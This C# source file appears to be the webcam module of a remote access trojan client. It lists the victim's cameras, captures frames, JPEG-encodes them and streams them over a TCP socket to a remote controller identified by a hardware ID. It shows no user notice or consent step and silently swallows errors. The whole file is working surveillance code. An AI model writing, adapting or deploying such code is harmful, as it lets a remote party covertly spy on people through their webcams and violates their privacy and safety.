using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Threading;
using AForge.Video;
using AForge.Video.DirectShow;
using MessagePack;
using Microsoft.VisualBasic.Logging;
using Encoder = System.Drawing.Imaging.Encoder;

namespace Client.HandlePacket
{
    internal class HandleCamera
    {
        public bool IsOk;
        public VideoCaptureDevice FinalVideo;
        private MemoryStream Camstream = new MemoryStream();
        public int Quality = 50;
        public string Controler_HWID { get; set; }


        public void CaptureRun(object sender, NewFrameEventArgs e)
        {
            try
            {
                if (Program.TCP_Socket.IsConnected)
                {
                    if (IsOk)
                    {
                        var image = (Bitmap) e.Frame.Clone();
                        using (Camstream = new MemoryStream())
                        {
                            var myEncoder = Encoder.Quality;
                            var myEncoderParameters = new EncoderParameters(1);
                            var myEncoderParameter = new EncoderParameter(myEncoder, Quality);
                            myEncoderParameters.Param[0] = myEncoderParameter;
                            var jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                            image.Save(Camstream, jpgEncoder, myEncoderParameters);
                            myEncoderParameters?.Dispose();
                            myEncoderParameter?.Dispose();
                            image?.Dispose();


                            var msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "webcam";
                            msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                            msgpack.ForcePathObject("Image").SetAsBytes(Camstream.ToArray());
                            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                        }
                    }
                }
                else
                {
                    CaptureDispose();
                }
            }
            catch (Exception)
            {
                CaptureDispose();
            }
        }

        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            var codecs = ImageCodecInfo.GetImageDecoders();
            foreach (var codec in codecs)
                if (codec.FormatID == format.Guid)
                    return codec;
            return null;
        }

        public static void GetWebcams(string Controler_HWID)
        {
            try
            {
                var deviceInfo = new StringBuilder();
                var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
                    deviceInfo.Append(videoCaptureDevice.Name + "-=>");
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "getWebcams";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("List").AsString = deviceInfo.Length > 0 ? deviceInfo.ToString() : "None-=>";
                new Thread(() => { Program.TCP_Socket.Send(msgpack.Encode2Bytes()); }).Start();
            }
            catch(Exception ex)
            {
                Program.TCP_Socket.Log(Controler_HWID,ex.Message);
            }
        }

        public void CaptureDispose()
        {
            try
            {
                IsOk = false;
                FinalVideo.Stop();
                FinalVideo.NewFrame -= CaptureRun;
                Camstream?.Dispose();
            }
            catch { }
        }
    }
}